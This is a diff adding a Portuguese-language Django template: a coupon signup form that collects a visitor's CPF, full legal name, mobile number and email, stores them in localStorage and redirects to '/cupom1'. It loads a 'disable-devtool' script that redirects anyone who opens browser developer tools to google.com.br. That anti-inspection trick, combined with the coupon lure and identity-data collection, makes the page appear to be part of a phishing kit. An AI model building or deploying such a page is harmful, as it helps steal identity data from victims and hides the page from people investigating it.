@@ -1,0 +1,133 @@
+{%extends 'core/base.html'%}
+{%load static%}
+{%block 'conteudo'%}
+
+    <body class="fundoWhite">
+
+        <div class="corteLayoutTop"></div>
+
+        <div id="p1" style="background-color: #FFFFFF; padding: 15px 0 50px 0;">
+
+            <img style="width: 35%; margin: auto; margin-left: 10px; position: relative; margin-top: 10px;" src="{%static 'images/logo2.png' %}" />
+
+            <form action="/cupom1" method="GET" id="formCadastro" onsubmit="document.getElementById('submit').disabled = true;">
+
+                <div class="coolinput">
+
+                    <div id="textoGuiaCpf">
+                        <h1 id="textoTitulo" style="font-family:'RecoletaBold'; font-size: 20px; margin: 25px 0 0 25px; color: #000000;">olá!</h1>
+                        <p id="textoInformacao" style="font-size: 15px; margin: 8px 0 30px 25px;">Informe seu CPF para a gente começar.</p>
+                    </div>
+
+                    <div id="validaCpf">
+                        <label for="input" id="textoCpf" class="text">CPF</label>
+                        <input type="text" placeholder="Digite seu CPF" name="cpfUsuario" id="cpfUsuario" class="input" inputmode="numeric" autocomplete="off" required onkeyup="validacaoCadastroCpf()">
+                        <div style="margin: -5px 0 0 10px;"><span id="validacaoCpf"></span></div>
+                    </div>
+
+
+
+                    <div id="textoGuiaNome">
+                        <h1 id="textoTitulo" style="font-family:'RecoletaBold'; font-size: 20px; margin: 25px 0 0 25px; color: #000000;">prazer, qual seu nome?</h1>
+                        <p id="textoInformacao" style="font-size: 15px; margin: 8px 0 30px 25px;">Para identificação, é fundamental que você digite seu nome exatamente como está escrito nos seus documentos.</p>
+                    </div>
+
+                    <div id="validaNome">
+                        <label for="input" id="textoNome" class="text">NOME</label>
+                        <input type="text" placeholder="Digite seu NOME" name="nomeUsuario" id="nomeUsuario" class="input" autocomplete="off" required onkeyup="validacaoCadastroNome()">
+                        <div style="margin: -5px 0 0 10px;"><span id="validacaoNome"></span></div>
+                    </div>
+
+
+
+                    <div id="textoGuiaCelular">
+                        <h1 id="textoTitulo" style="font-family:'RecoletaBold'; font-size: 20px; margin: 25px 0 0 25px; color: #000000;">qual o número do seu celular?</h1>
+                        <p id="textoInformacao" style="font-size: 15px; margin: 8px 0 30px 25px;">O celular é necessário para garantir que apenas você tenha acesso à sua conta.</p>
+                    </div>
+
+                    <div id="validaCelular">
+                        <label for="input" id="textoCelular" class="text">CELULAR</label>
+                        <input type="text" placeholder="Digite seu CELULAR" name="celularUsuario" id="celularUsuario" inputmode="numeric" class="input" autocomplete="off" required onkeyup="validacaoCadastroCelular()">
+                        <div style="margin: -5px 0 0 10px;"><span id="validacaoCelular"></span></div>
+                    </div>
+
+
+
+                    <div id="textoGuiaEmail">
+                        <h1 id="textoTitulo" style="font-family:'RecoletaBold'; font-size: 20px; margin: 25px 0 0 25px; color: #000000;">e seu e-mail, <span id="userName"></span>?</h1>
+                        <p id="textoInformacao" style="font-size: 15px; margin: 8px 0 30px 25px;">Preciso dele para a gente se comunicar e também para recuperar seus dados cadastrais, se necessário.</p>
+                    </div>
+
+                    <div style="position: relative;" id="validaEmail">
+                        <label style="z-index: 9999;" for="input" id="textoEmail" class="text">EMAIL</label>
+                        <input style="text-transform: lowercase;" type="text" placeholder="Digite seu EMAIL" name="emailUsuario" id="emailUsuario" class="input emailUsuario" autocomplete="off" required onkeyup="validacaoCadastroEmail()" onblur="validacaoCadastroEmail()">
+                        <input id="emailAux" class="aux" autocomplete="off">
+                        <div style="position: absolute;"><span id="validacaoEmail"></span></div>
+                    </div>
+
+
+
+                    <div id="textoGuiaFim">
+                        <h1 id="textoTitulo" style="font-family:'RecoletaBold'; font-size: 20px; margin: 25px 0 0 25px; color: #000000;">uhuul!</h1>
+                        <p id="textoInformacao" style="font-size: 15px; margin: 8px 0 30px 25px;">agora pode apertar em CONTINUAR logo abaixo.</p>
+                    </div>
+
+                    <div style="position: relative;">
+                        <button style="position: unset; width: 100%; margin-top: 30px;" id="continuarCadastroInativo" class="continuarInativo" disabled>Continuar</button>
+                        <button style="-webkit-animation: pulse 1.5s infinite; position: unset; width: 100%; margin-top: 30px;" id="continuarCadastroAtivo" class="continuarAtivo" data-callback='onSubmit' id="submit" data-action='submit'>Continuar</button>
+                    </div>
+                </div>
+
+            </form>
+            
+        </div>
+        
+
+        
+
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.0/jquery.mask.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>
+        <script src="{%static 'js/validacaoCadastro.js'%}"></script>
+        <script src="{%static 'js/funcoes.js' %}"></script>
+        <script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool' url='https://google.com.br'></script>
+        <script>        
+            // MÁSCARA INPUT
+            jQuery(function($){
+                $("#cpfUsuario").mask("999.999.999-99");
+                
+                $("#celularUsuario").mask("(99) 99999-9999");
+            });
+            // MÁSCARA INPUT
+        </script>
+
+        <script>
+            // Esta função será chamada quando o formulário for submetido
+            function salvarDadosFormulario(event) {
+                event.preventDefault(); // Impede que o formulário seja enviado e a página recarregada
+        
+                // Obtendo os valores dos inputs
+                const cpfUsuario = document.getElementById('cpfUsuario').value;
+                const nomeUsuario = document.getElementById('nomeUsuario').value;
+                const celularUsuario = document.getElementById('celularUsuario').value;
+                const emailUsuario = document.getElementById('emailUsuario').value;
+        
+                // Salvar no localStorage
+                localStorage.setItem('cpfUsuario', cpfUsuario);
+                localStorage.setItem('nomeUsuario', nomeUsuario);
+                localStorage.setItem('celularUsuario', celularUsuario);
+                localStorage.setItem('emailUsuario', emailUsuario);
+        
+                // Aqui você pode fazer o envio dos dados para o servidor via fetch ou outra chamada de API, se necessário
+                // ...
+        
+                // E aqui, você pode redirecionar o usuário para outra página ou mostrar uma mensagem de sucesso, se desejar
+                 window.location.href = '/cupom1';
+            }
+        
+            // Adiciona o evento de submissão ao formulário
+            document.getElementById('formCadastro').addEventListener('submit', salvarDadosFormulario);
+        </script>
+        {%endblock%}
+    </body>
+</html>
